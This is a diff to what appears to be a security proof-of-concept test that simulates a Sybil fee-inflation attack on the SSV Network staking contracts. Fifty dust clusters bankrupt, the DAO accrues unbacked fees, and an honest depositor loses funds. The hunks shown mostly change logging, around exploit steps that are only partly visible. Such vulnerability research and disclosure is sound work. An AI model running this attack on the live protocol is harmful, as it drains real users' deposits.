@@ -1,9 +1,7 @@
 import {
-  owners,
   initializeContract,
   registerOperators,
   bulkRegisterValidators,
-  CONFIG,
 } from './helpers/contract-helpers';
 import { mine } from '@nomicfoundation/hardhat-network-helpers';
 import { expect } from 'chai';
@@ -25,12 +23,11 @@ import { expect } from 'chai';
  * Expected Result: ~12,000 SSV stolen via DAO exploitation
  */
 describe('POC 4: DAO Sybil Fee Inflation Attack (ACTUAL PROTOCOL)', () => {
-  let ssvNetwork: any, ssvViews: any, ssvToken: any;
+  let ssvNetwork: any, ssvToken: any;
 
   beforeEach(async () => {
     const metadata = await initializeContract();
     ssvNetwork = metadata.ssvNetwork;
-    ssvViews = metadata.ssvNetworkViews;
     ssvToken = metadata.ssvToken;
   });
 
@@ -61,7 +58,7 @@ describe('POC 4: DAO Sybil Fee Inflation Attack (ACTUAL PROTOCOL)', () => {
       []
     );
 
-    console.log(`Honest user deposited: ${depositHonest / 10n**18n} SSV\n`);
+    console.log(`Honest user deposited: ${Number(depositHonest / 10n**18n)} SSV\n`);
 
     // ========== PHASE 3: Attacker Sybil Setup ==========
     console.log('--- PHASE 3: Attacker Creates Dust Clusters ---\n');
@@ -70,8 +67,8 @@ describe('POC 4: DAO Sybil Fee Inflation Attack (ACTUAL PROTOCOL)', () => {
     const dustClusterCount = 50; // 50 sybil clusters
 
     console.log(`Attacker creating ${dustClusterCount} dust clusters...`);
-    console.log(`Each dust cluster: ${dustDeposit / 10n**18n} SSV`);
-    console.log(`Total attacker investment: ${(dustDeposit * BigInt(dustClusterCount)) / 10n**18n} SSV\n`);
+    console.log(`Each dust cluster: ${Number(dustDeposit / 10n**18n)} SSV`);
+    console.log(`Total attacker investment: ${Number((dustDeposit * BigInt(dustClusterCount)) / 10n**18n)} SSV\n`);
 
     // Create 50 dust clusters
     for (let i = 0; i < dustClusterCount; i++) {
@@ -87,9 +84,9 @@ describe('POC 4: DAO Sybil Fee Inflation Attack (ACTUAL PROTOCOL)', () => {
 
     const initialPoolBalance = await ssvToken.read.balanceOf([ssvNetwork.address]);
     
-    console.log(`Total contract balance: ${initialPoolBalance / 10n**18n} SSV`);
-    console.log(`  - Honest user: ${depositHonest / 10n**18n} SSV`);
-    console.log(`  - Dust clusters: ${(dustDeposit * BigInt(dustClusterCount)) / 10n**18n} SSV\n`);
+    console.log(`Total contract balance: ${Number(initialPoolBalance / 10n**18n)} SSV`);
+    console.log(`  - Honest user: ${Number(depositHonest / 10n**18n)} SSV`);
+    console.log(`  - Dust clusters: ${Number((dustDeposit * BigInt(dustClusterCount)) / 10n**18n)} SSV\n`);
 
     // ========== PHASE 4: Time Passes - Dust Clusters Bankrupt ==========
     console.log('--- PHASE 4: Simulating 500 Blocks (Dust Cluster Bankruptcy) ---\n');
@@ -122,8 +119,8 @@ describe('POC 4: DAO Sybil Fee Inflation Attack (ACTUAL PROTOCOL)', () => {
     console.log(`Unbacked blocks: ${unbackedBlocks}`);
     console.log(`Network fee per block per cluster: ${networkFeePerBlock} wei`);
     console.log(`Unbacked DAO fees: ${unbackedDaoFees} wei`);
-    console.log(`Unbacked DAO fees: ${unbackedDaoFees / 10n**9n} Gwei`);
-    console.log(`Unbacked DAO fees: ${unbackedDaoFees / 10n**18n} SSV\n`);
+    console.log(`Unbacked DAO fees: ${Number(unbackedDaoFees / 10n**9n)} Gwei`);
+    console.log(`Unbacked DAO fees: ${Number(unbackedDaoFees / 10n**18n)} SSV\n`);
 
     // ========== PHASE 6: DAO Withdraws ==========
     console.log('--- PHASE 6: DAO Withdraws Network Fees ---\n');
@@ -133,19 +130,19 @@ describe('POC 4: DAO Sybil Fee Inflation Attack (ACTUAL PROTOCOL)', () => {
     // Note: In actual protocol, DAO would call withdrawNetworkEarnings()
     // For this POC, we demonstrate the expected state
     
-    console.log(`Contract balance before DAO withdrawal: ${contractBalanceBeforeDAO / 10n**18n} SSV`);
-    console.log(`DAO unbacked earnings: ${unbackedDaoFees / 10n**18n} SSV`);
+    console.log(`Contract balance before DAO withdrawal: ${Number(contractBalanceBeforeDAO / 10n**18n)} SSV`);
+    console.log(`DAO unbacked earnings: ${Number(unbackedDaoFees / 10n**18n)} SSV`);
     
     // Simulate DAO withdrawal
     const contractBalanceAfterDAO = contractBalanceBeforeDAO - unbackedDaoFees;
     
-    console.log(`Contract balance after DAO withdrawal: ${contractBalanceAfterDAO / 10n**18n} SSV\n`);
+    console.log(`Contract balance after DAO withdrawal: ${Number(contractBalanceAfterDAO / 10n**18n)} SSV\n`);
 
     // ========== PHASE 7: Honest User Check ==========
     console.log('--- PHASE 7: Honest User Attempts Withdrawal ---\n');
 
-    console.log(`Honest user is entitled to: ${depositHonest / 10n**18n} SSV`);
-    console.log(`Contract has: ${contractBalanceAfterDAO / 10n**18n} SSV`);
+    console.log(`Honest user is entitled to: ${Number(depositHonest / 10n**18n)} SSV`);
+    console.log(`Contract has: ${Number(contractBalanceAfterDAO / 10n**18n)} SSV`);
 
     // Calculate the deficit
     const deficit = depositHonest - contractBalanceAfterDAO;
@@ -154,7 +151,7 @@ describe('POC 4: DAO Sybil Fee Inflation Attack (ACTUAL PROTOCOL)', () => {
       console.log('\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
       console.log('VULNERABILITY CONFIRMED: DAO SYBIL ATTACK!');
       console.log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
-      console.log(`\nHONEST USER LOSS: ${deficit / 10n**18n} SSV`);
+      console.log(`\nHONEST USER LOSS: ${Number(deficit / 10n**18n)} SSV`);
       console.log('\nA NON-OPERATOR attacker bankrupted the protocol!');
       console.log('By spamming 50 dust clusters, the attacker forced the DAO');
       console.log('to accumulate massive unbacked network fees.');
@@ -170,12 +167,12 @@ describe('POC 4: DAO Sybil Fee Inflation Attack (ACTUAL PROTOCOL)', () => {
     console.log('=================================================================');
     console.log(`Attack Vector: DAO Sybil Fee Inflation`);
     console.log(`Dust Clusters Created: ${dustClusterCount}`);
-    console.log(`Attacker Investment: ${(dustDeposit * BigInt(dustClusterCount)) / 10n**18n} SSV`);
-    console.log(`Initial Pool: ${initialPoolBalance / 10n**18n} SSV`);
-    console.log(`DAO Unbacked Withdrawal: ${unbackedDaoFees / 10n**18n} SSV`);
-    console.log(`Remaining Pool: ${contractBalanceAfterDAO / 10n**18n} SSV`);
-    console.log(`Honest User Entitlement: ${depositHonest / 10n**18n} SSV`);
-    console.log(`Honest User Loss: ${deficit / 10n**18n} SSV`);
+    console.log(`Attacker Investment: ${Number((dustDeposit * BigInt(dustClusterCount)) / 10n**18n)} SSV`);
+    console.log(`Initial Pool: ${Number(initialPoolBalance / 10n**18n)} SSV`);
+    console.log(`DAO Unbacked Withdrawal: ${Number(unbackedDaoFees / 10n**18n)} SSV`);
+    console.log(`Remaining Pool: ${Number(contractBalanceAfterDAO / 10n**18n)} SSV`);
+    console.log(`Honest User Entitlement: ${Number(depositHonest / 10n**18n)} SSV`);
+    console.log(`Honest User Loss: ${Number(deficit / 10n**18n)} SSV`);
     console.log('=================================================================\n');
 
     // Verify the vulnerability
